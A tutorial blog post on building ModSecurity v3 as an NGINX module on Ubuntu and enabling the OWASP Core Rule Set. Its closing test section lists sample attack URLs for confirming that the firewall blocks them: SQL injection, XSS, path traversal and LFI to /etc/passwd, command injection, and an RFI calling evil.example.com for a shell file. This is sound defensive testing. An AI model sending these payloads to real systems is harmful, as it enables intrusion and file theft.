---
title: "Secure Your Website: A Complete Guide to Installing ModSecurity v3 and the OWASP CRS"
datePublished: Thu Oct 23 2025 09:11:33 GMT+0000 (Coordinated Universal Time)
cuid: cmh37dgmi000g02jx4fv8dajo
slug: secure-your-website-a-complete-guide-to-installing-modsecurity-v3-and-the-owasp-crs
cover: https://cdn.hashnode.com/res/hashnode/image/stock/unsplash/f5pTwLHCsAg/upload/0b73251a34646570c5bd0ca524ceb404.jpeg
tags: nginx, security, waf, modsecurity

---

In today's web environment, securing your applications is non-negotiable. One of the most effective ways to protect your server from common web attacks like SQL injection, XSS, and remote code execution is by implementing a Web Application Firewall (WAF).

ModSecurity is the world's most popular open-source WAF engine. When paired with the Owasp Core Rule Set (CRS), it provides a powerful and robust layer of defense.

This guide provides a complete, step-by-step walkthrough for compiling and installing ModSecurity v3 from scratch, integrating it with NGINX as a dynamic module, and enabling the powerful OWASP CRS on an Ubuntu server.

# Part 1 – Compiling and Installing the Modules and Enabling ModSecurity v3

This guide shows the complete installation of ModSecurity v3 with NGINX and the OWASP Core Rule Set (CRS) on an Ubuntu server – including correct module paths, symlink conventions, and example tests.

## 1\. Install Dependencies

First, let's update our server and install all the necessary build tools and libraries. This includes `git`, the build essentials, and various development libraries ModSecurity relies on.

```bash
sudo apt update
sudo apt install -y git g++ build-essential autoconf automake libtool \
  libpcre3 libpcre3-dev libpcre2-dev libxml2 libxml2-dev libyajl-dev \
  pkg-config zlib1g zlib1g-dev libcurl4-openssl-dev \
  liblua5.3-dev libgeoip-dev doxygen
```

## 2\. Compile and Install ModSecurity v3

We'll work within the `/usr/local/src` directory, a common place for building source code. We will clone the ModSecurity repository, initialize its submodules (which are required), and then run the build and installation process.

```bash
cd /usr/local/src
sudo git clone --depth 1 -b v3/master --single-branch https://github.com/SpiderLabs/ModSecurity
cd ModSecurity
sudo git submodule init
sudo git submodule update
sudo ./build.sh
sudo ./configure
sudo make -j"$(nproc)"
sudo make install
sudo apt install nginx
```

After a successful installation, ModSecurity was set up and the directory `/usr/local/modsecurity` was created, among others.

## 3\. Build the NGINX Module

Now we need the "glue" that connects NGINX to ModSecurity. This is a dynamic module that must be compiled against your *exact* running version of NGINX.

First, check your NGINX version:

```bash
nginx -v
```

In my case, output was:

```bash
nginx version: nginx/1.18.0 (Ubuntu)
```

Depending on that, you’ll need the NGINX source to build the ModSecurity module. In the example code, we clone ModSecurity‑nginx.git and then download the NGINX 1.24.0 source.

Then you build only the `NGINX` modules with `sudo make modules`.

```bash
cd /usr/local/src
sudo git clone https://github.com/SpiderLabs/ModSecurity-nginx.git
sudo wget http://nginx.org/download/nginx-1.18.0.tar.gz
sudo tar -xzf nginx-1.18.0.tar.gz
cd nginx-1.18.0
sudo ./configure --with-compat --add-dynamic-module=/usr/local/src//ModSecurity-nginx
sudo make modules
```

## 4\. Place and Enable the Module

You should now be in the directory `/usr/local/src/nginx-1.18.0`.

Copy the created NGINX module into the modules directory, then create the file `mod-modsecurity.conf` and the symlink in `nginx/modules-available`.

This configuration assumes:

* existing modules are in /usr/share/nginx/modules-available
    
* symlinks for enabled modules are in /etc/nginx/modules-enabled
    

```bash
sudo cp objs/ngx_http_modsecurity_module.so /usr/lib/nginx/modules/
sudo chmod 0644 /usr/lib/nginx/modules/ngx_http_modsecurity_module.so
echo "load_module modules/ngx_http_modsecurity_module.so;" | sudo tee /usr/share/nginx/modules-available/mod-modsecurity.conf
sudo ln -s /usr/share/nginx/modules-available/mod-modsecurity.conf /etc/nginx/modules-enabled/50-modsecurity.conf
```

## 5\. Create ModSecurity Configuration

Next, create the base configuration for ModSecurity.

```bash
sudo mkdir -p /etc/nginx/modsec
cd /etc/nginx/modsec
sudo cp /usr/local/src/ModSecurity/modsecurity.conf-recommended ./modsecurity.conf
sudo cp /usr/local/src/ModSecurity/unicode.mapping .
```

If the `unicode.mapping` file is missing, you can download it via wget:

```bash
wget https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/unicode.mapping -O /etc/nginx/modsec/unicode.mapping
```

## 6\. Enable Basic Rules

You have just copied `modsecurity.conf` into /etc/nginx/modsec.

Check that the following parameters are set correctly in the file:

```bash
SecRuleEngine On
SecAuditEngine RelevantOnly
SecAuditLog /var/log/modsec_audit.log
```

* `SecRuleEngine On`: This is the master switch. It activates ModSecurity.
    
* `SecAuditEngine RelevantOnly`: This logs only requests that were either blocked or generated an error.
    
* `SecAuditLog`: This specifies where to write the audit logs.
    

## 7\. Integrate the Module into Your Site and Test

Open your site’s NGINX config file in `/etc/nginx/sites-enabled`

In the `server` block, right after `listen`, insert the following:

```bash
server {
  listen ...
  server_name ...
  
  	# activate ModSecurity
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/modsecurity.conf;
```

Now create the file `/etc/nginx/modsec/modsec_test.conf`:

```bash
sudo nano /etc/nginx/modsec/modsec_test.conf
```

Add the following content:

```bash
# For testing purpose
SecRule REQUEST_URI "@contains blockme" "id:1001,phase:1,deny,status:403,msg:'Test rule triggered',chain"
SecRule REQUEST_URI "@beginsWith /test/"
```

Then edit `/etc/nginx/modsec/modsecurity.conf`:

```bash
sudo nano /etc/nginx/modsec/modsecurity.conf
```

Add this `Include` line at the end:

modsecurity.conf excerptInclude /etc/nginx/modsec/modsec\_test.conf

```bash
Include /etc/nginx/modsec/modsec_test.conf
```

You must now reload `nginx`:

```bash
sudo nginx -t && sudo systemctl reload nginx
```

From your local computer, send a test request using `curl`, or just enter the address in your web browser.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1761208122966/0e464253-1f30-4e28-980e-7efb4a518790.png align="center")

If you use `curl`, the result should look similar to:

```bash
curl -i "http://localhost/test/?test=blockme"
HTTP/1.1 403 Forbidden
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 23 Oct 2025 08:29:47 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive
```

The important part is `HTTP/2 403`, the HTTP status code for **Forbidden**, meaning the request was blocked and ModSecurity is working.

# Part 2 – Download and Activate the OWASP CRS

The following commands will let you download and activate the rule set. Change to the modsec directory, clone the Git repository, and create the `crs-setup.conf` file:

```bash
cd /etc/nginx/modsec
sudo git clone https://github.com/coreruleset/coreruleset.git

cd coreruleset
sudo cp crs-setup.conf.example crs-setup.conf
```

It should download the lastest CSR to `/rule` folder:

```bash
/etc/nginx/modsec/coreruleset/rules# ls
asp-dotnet-errors.data                                REQUEST-944-APPLICATION-ATTACK-JAVA.conf
iis-errors.data                                       REQUEST-949-BLOCKING-EVALUATION.conf
java-classes.data                                     RESPONSE-950-DATA-LEAKAGES.conf
lfi-os-files.data                                     RESPONSE-951-DATA-LEAKAGES-SQL.conf
php-errors.data                                       RESPONSE-952-DATA-LEAKAGES-JAVA.conf
php-function-names-933150.data                        RESPONSE-953-DATA-LEAKAGES-PHP.conf
php-variables.data                                    RESPONSE-954-DATA-LEAKAGES-IIS.conf
REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example   RESPONSE-955-WEB-SHELLS.conf
REQUEST-901-INITIALIZATION.conf                       RESPONSE-956-DATA-LEAKAGES-RUBY.conf
REQUEST-905-COMMON-EXCEPTIONS.conf                    RESPONSE-959-BLOCKING-EVALUATION.conf
REQUEST-911-METHOD-ENFORCEMENT.conf                   RESPONSE-980-CORRELATION.conf
REQUEST-913-SCANNER-DETECTION.conf                    RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example
REQUEST-920-PROTOCOL-ENFORCEMENT.conf                 restricted-files.data
REQUEST-921-PROTOCOL-ATTACK.conf                      restricted-upload.data
REQUEST-922-MULTIPART-ATTACK.conf                     ruby-errors.data
REQUEST-930-APPLICATION-ATTACK-LFI.conf               scanners-user-agents.data
REQUEST-931-APPLICATION-ATTACK-RFI.conf               sql-errors.data
REQUEST-932-APPLICATION-ATTACK-RCE.conf               ssrf.data
REQUEST-933-APPLICATION-ATTACK-PHP.conf               unix-shell-builtins.data
REQUEST-934-APPLICATION-ATTACK-GENERIC.conf           unix-shell.data
REQUEST-941-APPLICATION-ATTACK-XSS.conf               web-shells-asp.data
REQUEST-942-APPLICATION-ATTACK-SQLI.conf              web-shells-php.data
REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf  windows-powershell-commands.data
```

Next, include the following files in your `modsecurity.conf` file to activate the OWASP CRS:

```bash
Include /etc/nginx/modsec/coreruleset/crs-setup.conf
Include /etc/nginx/modsec/coreruleset/rules/*.conf
```

After restarting NGINX, the rule set is active:

```bash
sudo nginx -t && sudo systemctl reload nginx
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
```

## Testing the OWASP CRS

The following tests can be used to verify that the rule set is working. Either enter the URL in your browser or use `curl` with the `-I` parameter.

SQL injection via manipulated parameter: `http://ip/?id=1'+or+1=1--`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1761208562837/ab66df9c-3cb2-44ef-a30f-13a3b00842cf.png align="center")

Cross Site Scripting (XSS) – simple JavaScript: `http://ip/?search=<script>alert.js</script>`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1761208682163/5d255e3c-d272-4de4-8bbd-98f79765f162.png align="center")

Attempt to access a sensitive `.env` file: `http://ip/.env`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1761208738333/81378f09-dd9b-4679-9249-bc55192112fb.png align="center")

Path traversal to access system files: `http://ip/index.php?file=../../../../etc/passwd`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1761208796956/dcd4820e-1dce-469f-a5f6-41d9fa0d1efe.png align="center")

Command Injection via GET parameter: `http://ip/?cmd=ls%20-la`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1761208886728/0927f406-4003-47f8-a88e-61c652b213c7.png align="center")

Local File Inclusion (LFI): `http://ip/?testfile=../../../../etc/passwd%00`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1761209542940/a29aea55-0dc2-40d6-b590-7bfd777ec6e3.png align="center")

Remote File Inclusion (RFI): `http://ip/?page=http://evil.example.com/shell.txt&cmd=ls`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1761210171906/25646912-3b44-4713-990a-b02fa3bfb7f5.png align="center")

If you receive 403 responses for these requests, congratulations! Your server is now protected by ModSecurity v3 and the industry-standard OWASP Core Rule Set.

# Your Server is Secured. What's Next?

Congratulations! By following this guide, you have successfully compiled ModSecurity v3 from scratch, integrated it as a dynamic NGINX module, and deployed the powerful OWASP Core Rule Set. Your web server now has a formidable, active defense against the web's most common and dangerous attacks.

But the journey doesn't end here. A WAF is not a "set it and forget it" tool. Your immediate next step is to **monitor and tune**.

* **Watch the Logs:** Keep a close eye on your ModSecurity audit log, which we configured at `/var/log/modsec_audit.log`. This file is your best friend. It will show you exactly *what* is being blocked and *why*.
    
* **Tune for False Positives:** The OWASP CRS is designed to be strict, which means it might occasionally block legitimate requests from your application (known as "false positives"). By analyzing the logs, you can identify these and create custom rules to whitelist specific actions for your application, ensuring normal functionality isn't interrupted.
    
* **Stay Updated:** Security is a moving target. Regularly update your OWASP CRS rules by running `git pull` inside the `/etc/nginx/modsec/coreruleset` directory to protect against the latest threats.
    

You've built a solid foundation for your web application's security. By actively monitoring and tuning your new WAF, you can maintain a robust defense that is perfectly tailored to your environment.